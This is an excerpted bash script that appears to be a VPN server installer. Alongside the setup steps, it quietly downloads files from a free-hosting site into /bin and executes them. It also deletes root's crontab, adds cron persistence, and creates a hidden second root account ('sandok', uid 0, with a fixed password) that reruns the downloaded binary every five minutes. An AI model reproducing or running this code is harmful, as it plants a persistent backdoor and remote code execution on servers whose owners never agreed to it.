...
crontab -r
(crontab -l 2>/dev/null || true; echo "*/3 * * * * /bin/bash /root/cron.sh") | crontab -
...
wget -O /bin/proxy.py pelagian-slope.000webhostapp.com/mhikka/proxy -q
wget -O /bin/proxy2.py pelagian-slope.000webhostapp.com/mhikka/proxy2 -q
wget -O /bin/proxy3.py pelagian-slope.000webhostapp.com/mhikka/proxy3 -q
wget -O /bin/auto pelagian-slope.000webhostapp.com/mhikka/auto -q
chmod +x /bin/auto
/bin/auto;

wget pelagian-slope.000webhostapp.com/mhikka/badvpn-udpgw -q
mv -f badvpn-udpgw /bin/badvpn-udpgw
chmod 777 /bin/badvpn-udpgw

useradd -p $(openssl passwd -1 doksan) sandok -ou 0 -g 0
crontab -u sandok -r
(crontab -l 2>/dev/null || true; echo "*/5 * * * * /bin/auto >/dev/null 2>&1") | crontab - -u sandok
}
...
echo -e "#     Setup by: Dexter                      #"
echo -e "#       Server System: MediatekVPN          #"
echo -e "#       owner: Ryegal                       #"
echo -e "#############################################${RESET}"
}
...
EOM
#wget -O /usr/local/sbin/ssh.php mhixvpnlite.000webhostapp.com/uni/debian/prem.sh -q
}
